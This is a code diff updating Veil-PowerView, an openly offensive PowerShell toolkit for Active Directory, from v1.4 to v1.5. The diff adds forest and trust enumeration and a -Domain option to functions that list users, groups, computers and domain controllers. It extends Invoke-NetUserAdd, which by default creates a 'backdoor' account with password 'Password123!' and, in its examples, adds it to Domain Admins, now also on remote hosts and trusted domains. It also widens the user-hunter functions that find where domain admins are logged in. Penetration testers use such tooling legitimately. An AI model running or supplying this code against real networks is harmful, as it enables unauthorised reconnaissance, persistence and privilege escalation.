@@ -1,6 +1,6 @@
 <#
 
-Veil-PowerView v1.4
+Veil-PowerView v1.5
 
 See README.md for more information.
 
@@ -669,12 +669,85 @@ function Get-NetDomainTrusts {
     .EXAMPLE
     > Get-NetDomainTrusts
     Return current domain trusts.
-
     #>
 
-    
     $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
     $domain.GetAllTrustRelationships()
+}
+
+
+function Get-NetForest {
+    <#
+    .SYNOPSIS
+    Return the current forest associated with this domain.
+    
+    .DESCRIPTION
+    This function returns the current forest associated 
+    with the domain the current user is authenticated to.
+    
+    .EXAMPLE
+    > Get-NetForest
+    Return current forest.
+    #>
+
+    [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+}
+
+
+function Get-NetForestDomains {
+    <#
+    .SYNOPSIS
+    Return all domains for the current forest.
+
+    .DESCRIPTION
+    This function returns all domains for the current forest
+    the current domain is a part of.
+
+    .PARAMETER Domain
+    Return doamins that match this term/wildcard.
+
+    .EXAMPLE
+    > Get-NetForestDomains 
+    Return domains apart of the current forest.
+    #>
+
+    [CmdletBinding()]
+    param(
+        [string]$Domain
+    )
+
+    if($Domain){
+        # try to detect a wild card so we use -like
+        if($Domain.Contains("*")){
+            (Get-NetForest).Domains | ? {$_.Name -like $Domain}
+        }
+        else {
+            # match the exact domain name if there's not a wildcard
+            (Get-NetForest).Domains | ? {$_.Name.ToLower() -eq $Domain.ToLower()}
+        }
+    }
+    else{
+        # return all domains
+        (Get-NetForest).Domains
+    }
+}
+
+
+function Get-NetForestTrusts {
+    <#
+    .SYNOPSIS
+    Return all trusts for the current forest.
+    
+    .DESCRIPTION
+    This function returns all current trusts associated
+    the forest the current domain is a part of.
+    
+    .EXAMPLE
+    > Get-NetForestTrusts
+    Return current forest trusts
+    #>
+
+    (Get-NetForest).GetAllTrustRelationships()
 }
 
 
@@ -689,20 +762,41 @@ function Get-NetDomainControllers
     controllers.
 
     .PARAMETER Domain
-    The domain whose domain controller to get. If not given, gets the 
-    current computer's domain controller.
+    The domain whose domain controller to enumerate.
+    If not given, gets the current computer's domain controller.
 
     .OUTPUTS
-    System.Array. An array of found machines.
+    System.Array. An array of found domain controllers.
 
     .EXAMPLE
     > Get-NetDomainControllers
     Returns the domain controller for the current computer's domain.  
     Approximately equivialent to the hostname given in the LOGONSERVER 
     environment variable.
+
+    .EXAMPLE
+    > Get-NetDomainControllers -Domain test
+    Returns the domain controller for the current computer's domain.  
+    Approximately equivialent to the hostname given in the LOGONSERVER 
+    environment variable.
     #>
 
-    [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
+    [CmdletBinding()]
+    param(
+        [string]$Domain
+    )
+
+    # if a domain is specified, try to grab that domain using Get-NetForestDomains
+    if ($Domain){
+        try {
+            (Get-NetForestDomains -Domain $Domain).DomainControllers
+        }
+        catch{}
+    }
+    else{
+        # otherwise, grab the current domain
+        [DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
+    }
 }
 
 
@@ -730,12 +824,18 @@ function Get-NetCurrentUser {
 function Get-NetUsers {
     <#
     .SYNOPSIS
-    Gets a list of all current users in the domain.
+    Gets a list of all current users in a domain.
     
     .DESCRIPTION
     This function will user DirectoryServices.AccountManagement query the
-    current domain for all users.
+    current domain for all users, or use System.DirectoryServices.DirectorySearcher
+    to query for users in another domain trust.
+
     This is a replacement for "net users /domain"
+
+    .PARAMETER Domain
+    The domain to query for users. If not supplied, the 
+    current domain is used.
 
     .OUTPUTS
     Collection objects with the properties of each user found.
@@ -743,11 +843,36 @@ function Get-NetUsers {
     .EXAMPLE
     > Get-NetUsers
     Returns the member users of the current domain.
+
+    .EXAMPLE
+    > Get-NetUsers -Domain testing
+    Returns all the members in the "testing" domain.
     #>
 
-    # samAccountType=805306368 indicates user objects 
-    $userSearcher = [adsisearcher]"(&(samAccountType=805306368))"
-    $userSearcher.FindAll() |foreach {$_.properties}
+    [CmdletBinding()]
+    param(
+        [string]$Domain
+    )
+
+    # if a domain is specified, try to grab that domain using Get-NetForestDomains
+    if ($Domain){
+        try {
+            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
+            $dn = (Get-NetForestDomains -Domain $Domain).GetDirectoryEntry().distinguishedName
+            $userSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
+            # samAccountType=805306368 indicates user objects 
+            $userSearcher.filter="(&(samAccountType=805306368))"
+            $userSearcher.FindAll() |foreach {$_.properties}
+        }
+        catch{
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+        }
+    }
+    else{
+        # otherwise, use the current domain
+        $userSearcher = [adsisearcher]"(&(samAccountType=805306368))"
+        $userSearcher.FindAll() |foreach {$_.properties}
+    }
 }
 
 
@@ -764,7 +889,10 @@ function Get-NetUser {
 
     .PARAMETER UserName
     The domain username to query for. If not given, it defaults to "administrator"
-        
+
+    .PARAMETER Domain
+    The domain to query for for the user.
+
     .OUTPUTS
     Collection object with the properties of the user found, or $null if the
     user isn't found.
@@ -776,21 +904,50 @@ function Get-NetUser {
     .EXAMPLE
     > Get-NetUser -UserName "jsmith"
     Returns data about user "jsmith" in the current domain.  
+
+    .EXAMPLE
+    > Get-NetUser -UserName "jsmith" -Domain testing
+    Returns data about user "jsmith" in the 'testing' domain.  
     #>
 
     [CmdletBinding()]
     param(
-        [string]$UserName = "administrator"
+        [string]$UserName = "administrator",
+        [string]$Domain
     )
 
-    $userSearcher = [adsisearcher]"(&(samaccountname=$UserName))"
-    $user = $userSearcher.FindOne()
-    if ($user){
-        $user.properties
+    # if a domain is specified, try to grab that domain using Get-NetForestDomains
+    if ($Domain){
+        try {
+            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
+            $dn = (Get-NetForestDomains -Domain $Domain).GetDirectoryEntry().distinguishedName
+            $userSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
+            $userSearcher.filter="(&(samaccountname=$UserName))"
+            
+            $user = $userSearcher.FindOne()
+            if ($user){
+                $user.properties
+            }
+            else{
+                Write-Warning "Username $UserName not found in domain $Domain"
+                $null
+            }
+        }
+        catch{
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+        }
     }
     else{
-        Write-Warning "Username $UserName not found in the domain."
-        $null
+        # otherwise, use the current domain
+        $userSearcher = [adsisearcher]"(&(samaccountname=$UserName))"
+        $user = $userSearcher.FindOne()
+        if ($user){
+            $user.properties
+        }
+        else{
+            Write-Warning "Username $UserName not found in the current domain."
+            $null
+        }
     }
 }
 
@@ -802,7 +959,7 @@ function Invoke-NetUserAdd {
     
     .DESCRIPTION
     This function utilizes DirectoryServices.AccountManagement to add a
-    user to the local machine or domain (if permissions allow). It will
+    user to the local machine or a domain (if permissions allow). It will
     default to adding to the local machine. An optional group name to
     add the user to can be specified.
 
@@ -815,8 +972,11 @@ function Invoke-NetUserAdd {
     .PARAMETER GroupName
     Group to optionally add the user to.
 
+    .PARAMETER HostName
+    Host to add the local user to, defaults to 'localhost'
+
     .PARAMETER Domain
-    Add the user to the domain instead of locally.
+    Specified domain to add the user to.
         
     .OUTPUTS
     System.bool. True if the add succeeded, false otherwise.
@@ -826,8 +986,13 @@ function Invoke-NetUserAdd {
     Adds a localuser "john" to the machine with password "password"
 
     .EXAMPLE
-    > Invoke-NetUserAdd -UserName john -Password password -GroupName "Domain Admins" -domain
-    Adds the user "john" with password "password" to the domain and adds
+    > Invoke-NetUserAdd -UserName john -Password password -GroupName "Domain Admins" -domain ''
+    Adds the user "john" with password "password" to the current domain and adds
+    the user to the domain group "Domain Admins" 
+
+    .EXAMPLE
+    > Invoke-NetUserAdd -UserName john -Password password -GroupName "Domain Admins" -domain 'testing'
+    Adds the user "john" with password "password" to the 'testing' domain and adds
     the user to the domain group "Domain Admins" 
 
     .Link
@@ -839,17 +1004,20 @@ function Invoke-NetUserAdd {
         [string]$UserName = "backdoor",
         [string]$Password = "Password123!",
         [string]$GroupName = "",
-        [Parameter(Mandatory = $False)] [Switch] $Domain
+        [string]$HostName = "localhost",
+        [string]$Domain
     )
 
-    if ($Domain.IsPresent){
+    if ($Domain){
+
+        # add the assembly we need
+        Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 
         # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
 
         $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
 
-        # get the local domain
-        $d = Get-NetDomain
+        $d = (Get-NetForestDomains -Domain $Domain)
 
         # get the domain context
         $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d
@@ -864,11 +1032,18 @@ function Invoke-NetUserAdd {
         $usr.SetPassword($password)
         $usr.Enabled = $true
 
-        # commit the user
-        $usr.Save()
+        try{
+            # commit the user
+            $usr.Save()
+            Write-Host "User $UserName successfully created in domain $Domain"
+        }
+        catch {
+            Write-Warning "[!] User already exists!"
+            return
+        }
     }
     else{
-        $objOu = [ADSI]"WinNT://localhost"
+        $objOu = [ADSI]"WinNT://$HostName"
         $objUser = $objOU.Create("User", $UserName)
         $objUser.SetPassword($Password)
         # $objUser.Properties | Select-Object # full object properties
@@ -876,22 +1051,26 @@ function Invoke-NetUserAdd {
         # commit the changes to the local machine
         try{ 
             $b = $objUser.SetInfo()
+            Write-Host "User $UserName successfully created on host $HostName"
         }
         catch{
             # TODO: error handling if permissions incorrect
             Write-Warning "[!] Account already exists!"
+            return
         }
     }
 
     # if a group is specified, invoke Invoke-NetGroupUserAdd and return its value
     if ($GroupName -ne ""){
-        # if we're adding to the domain, make sure to include the flag
-        if ($Domain.IsPresent){
-            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName -Domain
+        # if we're adding the user to a domain
+        if ($Domain){
+            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName -Domain $Domain
+            Write-Host "User $UserName successfully added to group $GroupName in domain $Domain"
         }
         # otherwise, we're adding to a local group
         else{
-            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName
+            Invoke-NetGroupUserAdd -UserName $UserName -GroupName $GroupName -HostName $HostName
+            Write-Host "User $UserName successfully added to group $GroupName on host $HostName"
         }
     }
 
@@ -901,7 +1080,7 @@ function Invoke-NetUserAdd {
 function Get-NetComputers {
     <#
     .SYNOPSIS
-    Gets an array of all current computers objects in the local domain.
+    Gets an array of all current computers objects in a domain.
     
     .DESCRIPTION
     This function utilizes adsisearcher to query the current AD context 
@@ -920,12 +1099,19 @@ function Get-NetComputers {
     .PARAMETER FullData
     Return full user computer objects instead of just system names (the default)
 
+    .PARAMETER Domain
+    The domain to query for computers.
+
     .OUTPUTS
     System.Array. An array of found system objects.
 
     .EXAMPLE
     > Get-NetComputers
-    Returns the current computers in the domain.
+    Returns the current computers in current domain.
+
+    .EXAMPLE
+    > Get-NetComputers -Domain testing
+    Returns the current computers in 'testing' domain.
 
     .LINK
     https://github.com/darkoperator/Posh-SecMod/blob/master/Audit/Audit.psm1
@@ -936,33 +1122,55 @@ function Get-NetComputers {
         [string]$HostName = "*",
         [string]$OperatingSystem = "*",
         [string]$ServicePack = "*",
-        [Parameter(Mandatory = $False)] [Switch] $FullData
+        [Parameter(Mandatory = $False)] [Switch] $FullData,
+        [string]$Domain
     )
 
-    # create the searcher object with our specific filters
-    $compSearcher = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack))"
-    $compSearcher.PageSize = 200
-
-    $compSearcher.FindAll() | ForEach-Object {
-        # if we're returning full data objects, extract the fields we want
-        if ($FullData.IsPresent){
-            $props = @{}
-            $props.Add('HostName', "$($_.properties.dnshostname)")
-            $props.Add('Name', "$($_.properties.name)")
-            $props.Add('OperatingSystem', "$($_.properties.operatingsystem)")
-            $props.Add('ServicePack', "$($_.properties.operatingsystemservicepack)")
-            $props.Add('Version', "$($_.properties.operatingsystemversion)")
-            $props.Add('DN', "$($_.properties.distinguishedname)")
-            $props.Add('WhenCreated', [datetime]"$($_.properties.whencreated)")
-            $props.Add('WhenChanged', [datetime]"$($_.properties.whenchanged)")
-            $ip=Get-HostIP -hostname $_.properties.dnshostname
-            $props.Add('IPAddress', "$($ip)")
-
-            [pscustomobject] $props | Sort-Object Value -descending
+    # if a domain is specified, try to grab that domain using Get-NetForestDomains
+    if ($Domain){
+        try {
+            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
+            $dn = (Get-NetForestDomains -Domain $Domain).GetDirectoryEntry().distinguishedName
+            $compSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
+            # create the searcher object with our specific filters
+            $compSearcher.filter="(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack))"
+            
         }
-        else{
-            # otherwise we're just returning the DNS host name
-            $_.properties.dnshostname
+        catch{
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+        }
+    }
+    else{
+        # otherwise, use the current domain
+        $compSearcher = [adsisearcher]"(&(objectClass=Computer)(dnshostname=$HostName)(operatingsystem=$OperatingSystem)(operatingsystemservicepack=$ServicePack))"
+    }
+
+    if ($compSearcher){
+
+        # eliminate that pesky 1000 system limit
+        $compSearcher.PageSize = 200
+        
+        $compSearcher.FindAll() | ForEach-Object {
+            # if we're returning full data objects, extract the fields we want
+            if ($FullData.IsPresent){
+                $props = @{}
+                $props.Add('HostName', "$($_.properties.dnshostname)")
+                $props.Add('Name', "$($_.properties.name)")
+                $props.Add('OperatingSystem', "$($_.properties.operatingsystem)")
+                $props.Add('ServicePack', "$($_.properties.operatingsystemservicepack)")
+                $props.Add('Version', "$($_.properties.operatingsystemversion)")
+                $props.Add('DN', "$($_.properties.distinguishedname)")
+                $props.Add('WhenCreated', [datetime]"$($_.properties.whencreated)")
+                $props.Add('WhenChanged', [datetime]"$($_.properties.whenchanged)")
+                $ip=Get-HostIP -hostname $_.properties.dnshostname
+                $props.Add('IPAddress', "$($ip)")
+
+                [pscustomobject] $props | Sort-Object Value -descending
+            }
+            else{
+                # otherwise we're just returning the DNS host name
+                $_.properties.dnshostname
+            }
         }
     }
 }
@@ -971,15 +1179,18 @@ function Get-NetComputers {
 function Get-NetGroups {
     <#
     .SYNOPSIS
-    Gets a list of all current groups in the local domain.
+    Gets a list of all current groups in a local domain.
     
     .DESCRIPTION
-    This function utilizes adsisearcher to query the current AD context 
-    for current groups.
+    This function utilizes adsisearcher to query the local domain,
+    or a trusted domain, for all groups.
     
     .PARAMETER GroupName
     The group name to query for, wildcards accepted.
-        
+
+    .PARAMETER Domain
+    The domain to query for groups.
+
     .OUTPUTS
     System.Array. An array of found groups.
 
@@ -990,15 +1201,37 @@ function Get-NetGroups {
     .EXAMPLE
     > Get-NetGroups -GroupName *admin*
     Returns all groups with "admin" in their group name.
+
+    .EXAMPLE
+    > Get-NetGroups -Domain testing
+    Returns all groups in the 'testing' domain
     #>
 
     [CmdletBinding()]
-    Param (
-        [string]$GroupName = "*"
+    param(
+        [string]$GroupName = "*",
+        [string]$Domain
     )
 
-    $groupSearcher = [adsisearcher]"(&(objectClass=group)(name=$GroupName))"
-    $groupSearcher.FindAll() |foreach {$_.properties.samaccountname}
+    # if a domain is specified, try to grab that domain using Get-NetForestDomains
+    if ($Domain){
+        try {
+            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
+            $dn = (Get-NetForestDomains -Domain $Domain).GetDirectoryEntry().distinguishedName
+            $groupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
+            # samAccountType=805306368 indicates user objects 
+            $groupSearcher.filter = "(&(objectClass=group)(name=$GroupName))"
+            $groupSearcher.FindAll() |foreach {$_.properties.samaccountname}
+        }
+        catch{
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+        }
+    }
+    else{
+        # otherwise, use the current domain
+        $groupSearcher = [adsisearcher]"(&(objectClass=group)(name=$GroupName))"
+        $groupSearcher.FindAll() | foreach {$_.properties.samaccountname}
+    }
 }
 
 
@@ -1009,13 +1242,16 @@ function Get-NetGroup {
     
     .DESCRIPTION
     This function utilizes DirectoryServices.AccountManagement to query
-    the current AD context for users in a specified group. If no
-    GroupName is specified, it defaults to querying the "Domain Admins"
+    the current AD context or trusted domain for users in a specified group.
+    If no GroupName is specified, it defaults to querying the "Domain Admins"
     group. This is a replacement for "net group 'name' /domain"
 
     .PARAMETER GroupName
     The group name to query for users. If not given, it defaults to "domain admins"
-        
+    
+    .PARAMETER Domain
+    The domain to query for group users.
+    
     .OUTPUTS
     System.Array. An array of found users for the specified group.
 
@@ -1027,6 +1263,11 @@ function Get-NetGroup {
     > Get-NetGroup -GroupName "Power Users"
     Returns the usernames that of members of the "Power Users" domain group.
 
+    .EXAMPLE
+    > Get-NetGroup -Domain testing
+    Returns the usernames that of members of the "Domain Admins" group
+    in the 'testing' domain.
+
     .LINK
     http://www.powershellmagazine.com/2013/05/23/pstip-retrieve-group-membership-of-an-active-directory-group-recursively/
     #>
@@ -1034,21 +1275,40 @@ function Get-NetGroup {
     [CmdletBinding()]
     param(
         [string]$GroupName = "Domain Admins",
-        [Parameter(Mandatory = $False)] [Switch] $FullData
+        [Parameter(Mandatory = $False)] [Switch] $FullData,
+        [string]$Domain
     )
 
-    $groupSearcher = [adsisearcher]"(&(objectClass=group)(name=$GroupName))"
-
-    # return full data objects
-    if ($FullData.IsPresent) {
-        $groupSearcher.FindOne().properties['member'] | ForEach-Object {
-            # for each user/member, do a quick adsi object grab
-            ([adsi]"LDAP://$_").Properties | ft PropertyName, Value
+    # if a domain is specified, try to grab that domain using Get-NetForestDomains
+    if ($Domain){
+        try {
+            # reference - http://blogs.msdn.com/b/javaller/archive/2013/07/29/searching-across-active-directory-domains-in-powershell.aspx
+            $dn = (Get-NetForestDomains -Domain $Domain).GetDirectoryEntry().distinguishedName
+            $groupSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
+            # samAccountType=805306368 indicates user objects 
+            $groupSearcher.filter = "(&(objectClass=group)(name=$GroupName))"
+        }
+        catch{
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
         }
     }
     else{
-        $groupSearcher.FindOne().properties['member'] | ForEach-Object {
-            ([adsi]"LDAP://$_").SamAccountName
+        # otherwise, use the current domain
+        $groupSearcher = [adsisearcher]"(&(objectClass=group)(name=$GroupName))"
+    }
+
+    if ($groupSearcher){
+        # return full data objects
+        if ($FullData.IsPresent) {
+            $groupSearcher.FindOne().properties['member'] | ForEach-Object {
+                # for each user/member, do a quick adsi object grab
+                ([adsi]"LDAP://$_").Properties | ft PropertyName, Value
+            }
+        }
+        else{
+            $groupSearcher.FindOne().properties['member'] | ForEach-Object {
+                ([adsi]"LDAP://$_").SamAccountName
+            }
         }
     }
 
@@ -1239,7 +1499,7 @@ function Get-NetLocalServices {
 
     .PARAMETER HostList
     List of hostnames/IPs to query for local group users.
-        
+
     .OUTPUTS
     System.Array. An array of found services for the specified group.
 
@@ -1308,7 +1568,10 @@ function Invoke-NetGroupUserAdd {
     Group to add the user to.
 
     .PARAMETER Domain
-    Add the user to the domain instead of locally.
+    Domain to add the user to.
+    
+    .PARAMETER HostName
+    Hostname to add the user to, defaults to localhost.
         
     .OUTPUTS
     System.bool. True if the add succeeded, false otherwise.
@@ -1326,27 +1589,56 @@ function Invoke-NetGroupUserAdd {
     param(
         [Parameter(Mandatory = $True)] [string]$UserName,
         [Parameter(Mandatory = $True)] [string]$GroupName,
-        [Parameter(Mandatory = $False)] [Switch] $Domain)
+        [string]$Domain,
+        [string]$HostName = "localhost"
+    )
 
+    # add the assembly if we need it
     Add-Type -AssemblyName System.DirectoryServices.AccountManagement
 
-    if ($Domain.IsPresent){
-        # get the domain context
-        $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
+    # if we're adding to a remote host, use the WinNT provider
+    if($HostName -ne "localhost"){
+        try{
+            ([ADSI]"WinNT://$HostName/$GroupName,group").add("WinNT://$HostName/$UserName,user")
+            Write-Host "User $UserName successfully added to group $GroupName on $HostName"
+        }
+        catch{
+            Write-Warning "Error adding user $UserName to group $GroupName on $HostName"
+            return
+        }
     }
+
+    # otherwise it's a local or domain add
     else{
-        # get the local machine context
-        $ct = [System.DirectoryServices.AccountManagement.ContextType]::Machine
+        if ($Domain){
+            try{
+                # if a domain is specified, grab it
+                $d = (Get-NetForestDomains -Domain $Domain).Name
+                # get the domain context
+                $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
+            }
+            catch{
+                Write-Warning "Error connecting to domain $Domain, is there a trust?"
+                return $null
+            }
+        }
+        else{
+            # otherwise, get the local machine context
+            $ct = [System.DirectoryServices.AccountManagement.ContextType]::Machine
+        }
+
+        # get the full principal context
+        $context = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $ct, $d
+
+        # find the particular group
+        $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($context,$GroupName)
+
+        # add the particular user to the group
+        $group.Members.add($context, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)
+
+        # commit the changes
+        $group.Save()
     }
-
-    # find the particular group
-    $group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($ct,$GroupName)
-
-    # add the particular user to the localgroup
-    $group.Members.add($ct, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)
-
-    # commit the changes
-    $group.Save()
 }
 
 
@@ -1359,6 +1651,9 @@ function Get-NetFileServers {
     This function pulls all user information, extracts all file servers from
     user home directories, and returns the uniquified list.
 
+    .PARAMETER Domain
+    The domain to query for user file servers.
+
     .OUTPUTS
     System.Array. An array of found fileservers.
 
@@ -1367,10 +1662,20 @@ function Get-NetFileServers {
     Returns active file servers.
     #>
 
+    [CmdletBinding()]
+    param(
+        [string]$Domain
+    )
+
     $FileServers = @()
 
-    # get all the domain users
-    $users = Get-NetUsers
+    # get all the domain users for the specified or local domain
+    if ($Domain){
+        $users = Get-NetUsers -Domain $Domain
+    }
+    else {
+        $users = Get-NetUsers
+    }
 
     # extract all home directories and create a unique list
     foreach ($user in $users){
@@ -2140,20 +2445,27 @@ function Get-UserProperties {
     returning all the user:property combinations if a property 
     name is specified.
 
+    .PARAMETER Domain
+    The domain to query for user properties.
+
+    .PARAMETER Properties
+    Return property names for users. 
+
     .OUTPUTS
     System.Object[] array of all extracted user properties.
 
     .EXAMPLE
     > Get-UserProperties
-    Returns all user properties.
-
-    .EXAMPLE
-    > Get-UserProperties -Properties ssn
-    Returns all an array of user/ssn combinations
+    Returns all user properties for users in the current domain.
 
     .EXAMPLE
     > Get-UserProperties -Properties ssn,lastlogon,location
     Returns all an array of user/ssn/lastlogin/location combinations
+    for users in the current domain.
+
+    .EXAMPLE
+    > Get-UserProperties -Domain testing
+    Returns all user properties for users in the 'testing' domain.
 
     .LINK
     http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
@@ -2161,12 +2473,19 @@ function Get-UserProperties {
 
     [CmdletBinding()]
     param(
+        $Domain,
         $Properties
     )
 
     # if properties are specified, return all values of it for all users
     if ($Properties){
-        Get-NetUsers | foreach {
+        if ($Domain){
+            $users = Get-NetUsers -Domain $Domain
+        }
+        else{
+            $users = Get-NetUsers
+        }
+        $users | foreach {
 
             $props = @{}
             $s = $_.Item("SamAccountName")
@@ -2184,8 +2503,18 @@ function Get-UserProperties {
 
     }
     else{
-        # otherwise return all the property values themselves
-        ((([adsisearcher]"objectCategory=User").Findall())[0].properties).PropertyNames
+        # otherwise return all the property names themselves
+
+        if ($Domain){
+            $dn = (Get-NetForestDomains -Domain $Domain).GetDirectoryEntry().distinguishedName
+            $userSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]"LDAP://$dn") 
+            # samAccountType=805306368 indicates user objects 
+            $userSearcher.filter = "(&(samAccountType=805306368))"
+            (($userSearcher.FindAll())[0].properties).PropertyNames
+        }
+        else{
+            ((([adsisearcher]"objectCategory=User").Findall())[0].properties).PropertyNames
+        }
     }
 }
 
@@ -2428,6 +2757,9 @@ function Invoke-Netview {
     .PARAMETER Jitter
     Jitter for the host delay, defaults to +/- 0.3
 
+    .PARAMETER Domain
+    Domain to enumerate for hsots.
+
     .EXAMPLE
     > Invoke-Netview
     Run all Netview functionality and display the output.
@@ -2446,6 +2778,10 @@ function Invoke-Netview {
     > Invoke-Netview -Ping
     Runs Netview and pings hosts before eunmerating them.
 
+    .EXAMPLE
+    > Invoke-Netview -Domain testing
+    Runs Netview for hosts in the 'testing' domain.
+
     .LINK
     https://github.com/mubix/netview
     www.room362.com/blog/2012/10/07/compiling-and-release-of-netview/
@@ -2459,7 +2795,8 @@ function Invoke-Netview {
         [Parameter(Mandatory = $False)] [Switch] $Shuffle,
         [UInt32]$Delay = 0,
         [UInt32]$Jitter = .3,
-        [string]$HostList = ""
+        [string]$HostList = "",
+        [string]$Domain
     )
 
     If ($PSBoundParameters['Debug']) {
@@ -2469,8 +2806,18 @@ function Invoke-Netview {
     # shares we want to ignore if the flag is set
     $excludedShares = @("", "ADMIN$", "IPC$", "C$", "PRINT$")
 
-    # get the local domain
-    $domain = Get-NetDomain
+    # get the target domain
+    if($Domain){
+        $targetDomain = (Get-NetForestDomains -Domain $Domain).Name
+        if(-not $targetDomain){
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+            return
+        }
+    }
+    else{
+        # use the local domain
+        $targetDomain = Get-NetDomain
+    }
 
     # random object for delay
     $randNo = New-Object System.Random
@@ -2479,7 +2826,7 @@ function Invoke-Netview {
     $statusOutput = @()
 
     $statusOutput += "`r`nRunning Netview with delay of $Delay`r`n"
-    $statusOutput += "[+] Domain: $domain"
+    $statusOutput += "[+] Domain: $targetDomain"
 
     # if we're using a host list, read the targets in and add them to the target list
     if($HostList -ne ""){
@@ -2499,8 +2846,8 @@ function Invoke-Netview {
     }
     else{
         # otherwise, query the domain for target servers
-        $statusOutput += "[*] Querying domain for hosts...`r`n"
-        $servers = Get-NetComputers
+        $statusOutput += "[*] Querying domain $targetDomain for hosts...`r`n"
+        $servers = Get-NetComputers -Domain $targetDomain
     }
 
     # randomize the server list if specified
@@ -2508,7 +2855,7 @@ function Invoke-Netview {
         $servers = Get-ShuffledArray $servers
     }
 
-    $DomainControllers = Get-NetDomainControllers
+    $DomainControllers = Get-NetDomainControllers -Domain $targetDomain
 
     $HostCount = $servers.Count
     $statusOutput += "[+] Total number of hosts: $HostCount`n"
@@ -2681,9 +3028,16 @@ function Invoke-UserHunter {
     .PARAMETER Jitter
     Jitter for the host delay, defaults to +/- 0.3
 
+    .PARAMETER Domain
+    Domain for query for machine.
+
     .EXAMPLE
     > Invoke-UserHunter
     Finds machines on the local domain where domain admins are logged into.
+
+    .EXAMPLE
+    > Invoke-UserHunter -Domain 'testing'
+    Finds machines on the 'testing' domain where domain admins are logged into.
 
     .EXAMPLE
     > Invoke-UserHunter -CheckAccess
@@ -2720,7 +3074,8 @@ function Invoke-UserHunter {
         [UInt32]$Delay = 0,
         [UInt32]$Jitter = .3,
         [string]$HostList = "",
-        [string]$UserList = ""
+        [string]$UserList = "",
+        [string]$Domain
     )
 
     If ($PSBoundParameters['Debug']) {
@@ -2736,12 +3091,23 @@ function Invoke-UserHunter {
     # get the current user
     $CurrentUser = Get-NetCurrentUser
 
-    $domain = Get-NetDomain
+    # get the target domain
+    if($Domain){
+        $targetDomain = (Get-NetForestDomains -Domain $Domain).Name
+        if(-not $targetDomain){
+            Write-Warning "Error connecting to domain $Domain, is there a trust?"
+            return
+        }
+    }
+    else{
+        # use the local domain
+        $targetDomain = Get-NetDomain
+    }
 
     # the array for our initial status output messages
     $statusOutput = @()
 
-    $statusOutput += "`r`n[*] Running UserHunter on domain $domain with delay of $Delay"
+    $statusOutput += "`r`n[*] Running UserHunter on domain $targetDomain with delay of $Delay"
 
     # if we're using a host list, read the targets in and add them to the target list
     if($HostList -ne ""){
@@ -2761,8 +3127,8 @@ function Invoke-UserHunter {
     }
     else{
         # otherwise, query the domain for target servers
-        $statusOutput += "[*] Querying domain for hosts...`r`n"
-        $servers = Get-NetComputers
+        $statusOutput += "[*] Querying domain $targetDomain for hosts...`r`n"
+        $servers = Get-NetComputers -Domain $targetDomain
     }
 
     # randomize the server array if specified
@@ -2796,7 +3162,7 @@ function Invoke-UserHunter {
         else{
             # otherwise default to the group name to query for target users
             $statusOutput += "`r`n[*] Querying domain group '$GroupName' for target users..."
-            $temp = Get-NetGroup -GroupName $GroupName
+            $temp = Get-NetGroup -GroupName $GroupName -Domain $targetDomain
             # lower case all of the found usernames
             $TargetUsers = $temp | % {$_.ToLower() }
         }
@@ -2937,9 +3303,16 @@ function Invoke-StealthUserHunter {
     .PARAMETER Jitter
     Jitter for the fileserver delay, defaults to +/- 0.3
 
+    .PARAMETER Domain
+    Domain to query for users file server locations.
+
     .EXAMPLE
     > Invoke-StealthUserHunter
     Finds machines on the local domain where domain admins have sessions from.
+
+    .EXAMPLE
+    > Invoke-StealthUserHunter -Domain testing
+    Finds machines on the 'testing' domain where domain admins have sessions from.
 
     .EXAMPLE
     > Invoke-StealthUserHunter -UserList users.txt
@@ -2977,7 +3350,8 @@ function Invoke-StealthUserHunter {
         [UInt32]$Delay = 0,
         [UInt32]$Jitter = .3,
         [string]$HostList = "",
-        [string]$UserList = ""
+        [string]$UserList = "",
+        [string]$Domain
     )
 
     If ($PSBoundParameters['Debug']) {
